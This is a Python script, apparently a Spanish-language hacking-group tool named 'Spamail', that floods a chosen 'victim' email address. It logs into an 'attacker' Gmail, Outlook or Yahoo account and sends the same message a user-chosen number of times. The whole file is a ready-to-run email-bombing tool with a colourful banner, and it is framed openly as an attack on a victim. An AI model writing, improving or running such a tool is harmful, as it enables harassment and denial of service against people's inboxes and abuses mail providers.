#!/usr/bin/python
#Coded by: Sempatte
#fSociety
#www.fuck-society.com
#v.1.2
import os
import smtplib
import getpass
import sys
import argparse
import colorama
from colorama import Fore
import requests
import urllib
import pycurl
from io import BytesIO

#BANNER
print(Fore.BLUE)
print(           "                                                   ◘◘           ██╗   ██╗  ██╗   ██████╗      ")
print(           "        ███████╗██████╗  █████╗ ███╗   ███╗ █████╗ ██╗██╗       ██║   ██║ ███║   ╚════██╗     ")
print(           "        ███████╗██████╔╝███████║██╔████╔██║███████║██║██║       ██║   ██║ ╚██║    █████╔╝     ")
print(           "        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██╔══██║██║██║       ╚██╗ ██╔╝  ██║   ██╔═══╝      ")
print(           "        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║  ██║██║███████╗   ╚████╔╝██╗██║██╗███████╗     ")
print(           "        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═══╝ ╚═╝╚═╝╚═╝╚══════╝     ")
print(           "                                                                                                ")
print(Fore.CYAN)
print(           " ██████╗ ██╗   ██╗       ███████╗███████╗███╗   ███╗██████╗  █████╗ ████████╗████████╗███████╗   ")
print(           " ██╔══██╗╚██╗ ██╔╝██╗    ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝   ")
print(           " ██████╔╝ ╚████╔╝ ╚═╝    ███████╗█████╗  ██╔████╔██║██████╔╝███████║   ██║      ██║   █████╗     ")
print(           " ██╔══██╗  ╚██╔╝  ██╗    ╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██║   ██║      ██║   ██╔══╝     ")
print(           " ██████╔╝   ██║   ╚═╝    ███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║   ██║      ██║   ███████╗  ")
print(           " ╚═════╝    ╚═╝          ╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝  ")
print(            "                                                                                               ")
print(            "                       Importante: sudo pip install -r requirements.txt                        ")
print(            "                                                                                               ")
print(Fore.CYAN +"                                https://www.fuck-society.com                                    ")
print(Fore.WHITE +"                          Funcionando en: Gmail, Outlook y Yahoo                               ")
print(            "                                                                                               ")

#Comprobar conectividad
def connected(host='http://www.google.com'):
    try:
        urllib.request.urlopen(host)
        return True
    except:
        return False
if connected():
  pass
else:
  print(Fore.GREEN + "[!] No esta conectado a internet. Intentalo de nuevo.")
  sys.exit()

  
print(Fore.WHITE)
parser = argparse.ArgumentParser()
parser.add_argument("-d", "--debug", help="Mostrar información de depuración")


args = parser.parse_args()

if args.debug:
   print(Fore.RED +"[ON] Depuración")

""" IP """
buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, 'http://wtfismyip.com/text')
c.setopt(c.WRITEDATA, buffer)
c.perform()
c.close()

body = buffer.getvalue()
ip = body.decode('iso-8859-1')
#print("IP PUBLIC: " + ip[7:22])
print(Fore.GREEN + "Tu IP publica: "+ ip)
print(Fore.WHITE)
""" IP """

server = input("[+] Mail server: Gmail, Hotmail/Outlook o Yahoo: ")
server = server.lower()

if server == 'outlook':
	server = 'hotmail'
#Permitir1
print(Fore.GREEN +" ")
advr = "\n[!] Para poder usar correctamente el MailServer de '%s' debes permitir el acceso\n\n"%(server)
if server == 'gmail':
	print(advr)
	print("Foro: https://support.google.com/a/answer/6260879?hl=es")
	print("Link directo: https://myaccount.google.com/u/0/security?hl=es#connectedapps\n")
else:
	pass
#Permitir2
if server == 'yahoo':
	print(advr)
	print("Link directo: https://login.yahoo.com/account/security?.scrumb=xTZ2fUgh2eG#other-apps\n")
else:
	pass
#Permitir3
if server == 'hotmail':
	print(advr)
	print("Link directo: https://outlook.live.com/owa/?path=/options/popandimap\n")
else:
	pass

print(Fore.WHITE +" ")
#Correo atacante
user = str(input('[+] Correo del atacante: '))

confirm = input('[?] Confirmar? Si/no: ')
confirm = confirm.lower()

if confirm == 'no':
	user = str(input('[REPET] Correo del atacante: '))
else:
	pass


cda = ('[SET] Correo del atacante: %s')%(user)
print(cda)

password = getpass.getpass('[+] Contraseña del atacante: ')

#Correo victima
to = input('\n[+] Victima: ')
vct = ('[SET] Correo de la victima: %s')%(to)

confirm_two = input('[?] Confirmar? Si/no: ')
confirm_two = confirm_two.lower()

if confirm_two == 'no':
	vct = str(input('[REPET] Correo de la victima: '))
else:
	pass


vct_two = ('[SET] Correo de la victima: %s')%(vct)
print(vct_two)

#Mensaje
body = input('[+] Mensaje a enviar: ')

#Nº
numero = int(input('[+] Numero de veces a enviar:'))
nmr = ('[SET] Nº: %s')%(numero)
print(nmr)

#Confirmar proceso
print(Fore.RED)
cfr_dos = input("¿Esta seguro que desea continuar? si/no: ")
print(Fore.WHITE)
if cfr_dos == 'no':
	sys.exit()
else:
	pass


if server == 'gmail':
	smtp_server = 'smtp.gmail.com'
	port = 587
elif server == 'yahoo':
	smtp_server = 'smtp.mail.yahoo.com'
	port = 25
elif server == 'hotmail':
	smtp_server = 'smtp-mail.outlook.com'
	port = 587
else:
	print('[-] Mail server erroneo, intentalo de nuevo.')
	sys.exit()

try:
	server = smtplib.SMTP(smtp_server,port)
	server.connect(smtp_server,port)
	server.ehlo()
	if smtp_server == 'smtp.gmail.com':
		server.starttls()
	if smtp_server == 'smtp-mail.outlook.com':
		server.starttls()
	if smtp_server == 'smtp.mail.yahoo.com':
		server.starttls()

	server.login(user,password)


	for i in range(1, numero+1):
		subject = os.urandom(9)
		msg = (body)
		server.sendmail(user, to ,msg)
		sends = "\rE-mails enviados: [%i]" % i
		if args.debug:
			print(sends)
			sys.stdout.flush()			
		else:
				pass		
	server.quit()
	print("[!] Hecho con exito!")
except KeyboardInterrupt:
	print("[Ctrl+C] Cancelado por el usuario")
	sys.exit()
except smtplib.SMTPAuthenticationError:
    print('\n[!] El usuario/email o contraseña introducidos del atacante son erroneos.\nIntentalo de nuevo.')
    sys.exit()
except smtplib.SMTPServerDisconnected:
	print('\n [!] El serve fue desconectado por algun error desconocido.\n Intentalo de nuevo.')
except smtplib.SMTPConnectError:
	print('\n [!] Error al intentar conectar con el server.\n Verifica tu conexión.')

